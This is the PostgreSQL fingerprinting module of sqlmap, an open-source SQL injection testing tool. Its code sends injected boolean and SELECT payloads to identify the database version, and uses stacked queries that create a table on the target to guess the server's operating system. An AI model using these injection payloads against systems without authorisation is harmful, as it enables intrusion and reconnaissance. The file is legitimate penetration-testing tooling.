#!/usr/bin/env python

"""
$Id: fingerprint.py 2349 2010-11-12 10:02:02Z inquisb $

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.session import setDbms
from lib.core.settings import PGSQL_ALIASES
from lib.core.settings import PGSQL_SYSTEM_DBS
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.POSTGRESQL
            return value

        actVer      = formatDBMSfp()
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * http://www.postgresql.org/docs/8.4/interactive/release.html (up to 8.4.2)
        """

        if conf.dbms in PGSQL_ALIASES:
            setDbms(DBMS.POSTGRESQL)

            self.getBanner()

            if not conf.extensiveFp:
                return True

        infoMsg = "testing PostgreSQL"
        logger.info(infoMsg)

        randInt = getUnicode(randomInt(1))

        payload = agent.fullPayload("AND %s::int=%s" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result:
            infoMsg = "confirming PostgreSQL"
            logger.info(infoMsg)

            payload = agent.fullPayload("AND COALESCE(%s, NULL)=%s" % (randInt, randInt))
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DBMS is not PostgreSQL"
                logger.warn(warnMsg)

                return False

            setDbms(DBMS.POSTGRESQL)

            self.getBanner()

            if not conf.extensiveFp:
                return True

            if inject.getValue("SELECT DIV(6, 3)", unpack=False, charsetType=2, suppressOutput=True) == "2":
                kb.dbmsVersion = [">= 8.4.0"]
            elif inject.getValue("SELECT SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)", unpack=False, charsetType=2, suppressOutput=True) in ( "1", "2" ) and not inject.getValue("SELECT SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)", unpack=False, charsetType=2, suppressOutput=True) in ( "1", "2" ):
                kb.dbmsVersion = [">= 8.3.0", "< 8.4"]
            elif inject.getValue("SELECT SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)", unpack=False, charsetType=2, suppressOutput=True):
                kb.dbmsVersion = [">= 8.2.0", "< 8.3.0"]
            elif inject.getValue("SELECT GREATEST(5, 9, 1)", unpack=False, charsetType=2, suppressOutput=True) == "9":
                kb.dbmsVersion = [">= 8.1.0", "< 8.2.0"]
            elif inject.getValue("SELECT WIDTH_BUCKET(5.35, 0.024, 10.06, 5)", unpack=False, charsetType=2, suppressOutput=True) == "3":
                kb.dbmsVersion = [">= 8.0.0", "< 8.1.0"]
            elif inject.getValue("SELECT SUBSTR(MD5('sqlmap'), 1, 1)", unpack=False, suppressOutput=True):
                kb.dbmsVersion = [">= 7.4.0", "< 8.0.0"]
            elif inject.getValue("SELECT SUBSTR(CURRENT_SCHEMA(), 1, 1)", unpack=False, suppressOutput=True) == "p":
                kb.dbmsVersion = [">= 7.3.0", "< 7.4.0"]
            elif inject.getValue("SELECT BIT_LENGTH(1)") == "8":
                kb.dbmsVersion = [">= 7.2.0", "< 7.3.0"]
            elif inject.getValue("SELECT SUBSTR(QUOTE_LITERAL('a'), 2, 1)", unpack=False, suppressOutput=True) == "a":
                kb.dbmsVersion = [">= 7.1.0", "< 7.2.0"]
            elif inject.getValue("SELECT POW(2, 3)", unpack=False, charsetType=2, suppressOutput=True) == "8":
                kb.dbmsVersion = [">= 7.0.0", "< 7.1.0"]
            elif inject.getValue("SELECT MAX('a')") == "a":
                kb.dbmsVersion = [">= 6.5.0", "< 6.5.3"]
            elif re.search("([\d\.]+)", inject.getValue("SELECT SUBSTR(VERSION(), 12, 5)", unpack=False, suppressOutput=True)):
                kb.dbmsVersion = [">= 6.4.0", "< 6.5.0"]
            elif inject.getValue("SELECT SUBSTR(CURRENT_DATE, 1, 1)", unpack=False, charsetType=2, suppressOutput=True) == "2":
                kb.dbmsVersion = [">= 6.3.0", "< 6.4.0"]
            elif inject.getValue("SELECT SUBSTRING('sqlmap', 1, 1)", unpack=False, suppressOutput=True) == "s":
                kb.dbmsVersion = [">= 6.2.0", "< 6.3.0"]
            else:
                kb.dbmsVersion = ["< 6.2.0"]

            return True
        else:
            warnMsg = "the back-end DBMS is not PostgreSQL"
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if kb.os:
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "character(10000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))

        # Windows executables should always have ' Visual C++' or ' mingw'
        # patterns within the banner
        osWindows = ( " Visual C++", "mingw" )

        for osPattern in osWindows:
            query  = "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%" + osPattern + "%')>0"
            query  = agent.forgeCaseStatement(query)

            if inject.getValue(query, charsetType=1, suppressOutput=True) == "1":
                kb.os = "Windows"

                break

        if kb.os is None:
            kb.os = "Linux"

        infoMsg = "the back-end DBMS operating system is %s" % kb.os
        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)

    def forceDbmsEnum(self):
        if conf.db not in PGSQL_SYSTEM_DBS and conf.db != "public":
            conf.db = "public"

            warnMsg  = "on PostgreSQL it is only possible to enumerate "
            warnMsg += "on the current schema and on system databases, "
            warnMsg += "sqlmap is going to use 'public' schema as "
            warnMsg += "database name"
            logger.warn(warnMsg)
